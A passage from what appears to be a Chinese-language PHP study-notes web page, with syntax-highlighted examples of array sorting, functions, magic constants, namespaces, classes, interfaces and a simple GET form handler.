punctuation">(</span><span class="token variable">$age</span> <span class="token keyword">as</span> <span class="token variable">$x</span><span class="token operator">=&gt;</span><span class="token variable">$x_value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Key="</span> <span class="token operator">.</span> <span class="token variable">$x</span> <span class="token operator">.</span> <span class="token string double-quoted-string">", Value="</span> <span class="token operator">.</span> <span class="token variable">$x_value</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">asort</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//键值升序</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$age</span> <span class="token keyword">as</span> <span class="token variable">$x</span><span class="token operator">=&gt;</span><span class="token variable">$x_value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Key="</span> <span class="token operator">.</span> <span class="token variable">$x</span> <span class="token operator">.</span> <span class="token string double-quoted-string">", Value="</span> <span class="token operator">.</span> <span class="token variable">$x_value</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">arsort</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//键值降序</span><span class="token function">ksort</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//键名升序</span><span class="token function">krsort</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//键名降序</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">each</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">test</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"????"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'fuck'</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string double-quoted-string">"you arb bici"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="魔术变量"><a href="#魔术变量" class="headerlink" title="魔术变量"></a>魔术变量</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'这是第 " '</span>  <span class="token operator">.</span> <span class="token constant">__LINE__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' " 行'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'该文件位于 " '</span>  <span class="token operator">.</span> <span class="token constant">__FILE__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' " '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'该文件位于 " '</span>  <span class="token operator">.</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' " '</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span>  <span class="token string single-quoted-string">'函数名为：'</span> <span class="token operator">.</span> <span class="token constant">__FUNCTION__</span> <span class="token punctuation">;</span>    <span class="token keyword">echo</span>  <span class="token string single-quoted-string">'函数名为：'</span> <span class="token operator">.</span> <span class="token constant">__METHOD__</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function-definition function">_print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'类名为：'</span>  <span class="token operator">.</span> <span class="token constant">__CLASS__</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span>  <span class="token string single-quoted-string">'函数名为：'</span> <span class="token operator">.</span> <span class="token constant">__FUNCTION__</span> <span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$t</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$t</span><span class="token operator">-&gt;</span><span class="token function">_print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Base</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hello '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">trait</span> <span class="token class-name-definition class-name">SayWorld</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'World!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">MyHelloWorld</span> <span class="token keyword">extends</span> <span class="token class-name">Base</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">SayWorld</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyHelloWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//namespace MyProject;</span><span class="token comment">//echo '命名空间为："', __NAMESPACE__, '"'; // 输出 "MyProject"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">namespace</span> <span class="token package">MyProject</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">CONNECT_OK</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Connection</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span>  <span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">AnotherProject</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">CONNECT_OK</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Connection</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span>  <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Site</span> <span class="token punctuation">{</span>    <span class="token comment">/* 成员变量 */</span>    <span class="token keyword">var</span> <span class="token variable">$url</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$title</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span> <span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">url</span> <span class="token operator">=</span> <span class="token variable">$par1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">title</span> <span class="token operator">=</span> <span class="token variable">$par2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">print</span> <span class="token string double-quoted-string">"销毁 "</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/* 成员函数 */</span>    <span class="token keyword">function</span> <span class="token function-definition function">setUrl</span><span class="token punctuation">(</span><span class="token variable">$par</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">url</span> <span class="token operator">=</span> <span class="token variable">$par</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">url</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">setTitle</span><span class="token punctuation">(</span><span class="token variable">$par</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">title</span> <span class="token operator">=</span> <span class="token variable">$par</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">title</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$runoob</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Site</span><span class="token punctuation">;</span><span class="token variable">$taobao</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Site</span><span class="token punctuation">;</span><span class="token variable">$google</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Site</span><span class="token punctuation">;</span><span class="token comment">// 调用成员函数，设置标题和URL</span><span class="token variable">$runoob</span><span class="token operator">-&gt;</span><span class="token function">setTitle</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"菜鸟教程"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$taobao</span><span class="token operator">-&gt;</span><span class="token function">setTitle</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"淘宝"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$google</span><span class="token operator">-&gt;</span><span class="token function">setTitle</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"Google 搜索"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$runoob</span><span class="token operator">-&gt;</span><span class="token function">setUrl</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'www.runoob.com'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$taobao</span><span class="token operator">-&gt;</span><span class="token function">setUrl</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'www.taobao.com'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$google</span><span class="token operator">-&gt;</span><span class="token function">setUrl</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'www.google.com'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 调用成员函数，获取标题和URL</span><span class="token variable">$runoob</span><span class="token operator">-&gt;</span><span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$taobao</span><span class="token operator">-&gt;</span><span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$google</span><span class="token operator">-&gt;</span><span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$runoob</span><span class="token operator">-&gt;</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$taobao</span><span class="token operator">-&gt;</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$google</span><span class="token operator">-&gt;</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 子类扩展站点类别</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Child_Site</span> <span class="token keyword">extends</span> <span class="token class-name">Site</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$category</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">setCate</span><span class="token punctuation">(</span><span class="token variable">$par</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">category</span> <span class="token operator">=</span> <span class="token variable">$par</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">getCate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">category</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// 声明一个'iTemplate'接口</span><span class="token keyword">interface</span> <span class="token class-name-definition class-name">iTemplate</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setVariable</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getHtml</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// 实现接口</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Template</span> <span class="token keyword">implements</span> <span class="token class-name">iTemplate</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setVariable</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">vars</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getHtml</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">vars</span> <span class="token keyword">as</span> <span class="token variable">$name</span> <span class="token operator">=&gt;</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$template</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'{'</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'}'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$template</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> <span class="token constant">constant</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'常量值'</span><span class="token punctuation">;</span><span class="token comment">//如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">AbstractClass</span><span class="token punctuation">{</span>    <span class="token comment">// 强制要求子类定义这些方法</span>    <span class="token keyword">abstract</span> <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">prefixValue</span><span class="token punctuation">(</span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 普通方法（非抽象方法）</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">printOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">print</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ConcreteClass1</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractClass</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"ConcreteClass1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">prefixValue</span><span class="token punctuation">(</span><span class="token variable">$prefix</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$prefix</span><span class="token punctuation">}</span></span>ConcreteClass1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ConcreteClass2</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractClass</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"ConcreteClass2"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">prefixValue</span><span class="token punctuation">(</span><span class="token variable">$prefix</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$prefix</span><span class="token punctuation">}</span></span>ConcreteClass2"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$class1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteClass1</span><span class="token punctuation">;</span><span class="token variable">$class1</span><span class="token operator">-&gt;</span><span class="token function">printOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$class1</span><span class="token operator">-&gt;</span><span class="token function">prefixValue</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FOO_'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token variable">$class2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteClass2</span><span class="token punctuation">;</span><span class="token variable">$class2</span><span class="token operator">-&gt;</span><span class="token function">printOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$class2</span><span class="token operator">-&gt;</span><span class="token function">prefixValue</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FOO_'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$q</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$q</span> <span class="token operator">==</span><span class="token string single-quoted-string">'RUNOOB'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'菜鸟教程&lt;br&gt;http://www.runoob.com'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$q</span> <span class="token operator">==</span><span class="token string single-quoted-string">'GOOGLE'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Google 搜索&lt;br&gt;http://www.google.com'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$q</span> <span class="token operator">==</span><span class="token string single-quoted-string">'TAOBAO'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'淘宝&lt;br&gt;http://www.taobao.com'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>q<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>RUNOOB<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>Runoob    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>q<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GOOGLE<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>Google    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>q<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TAOBAO<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>Taobao    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" 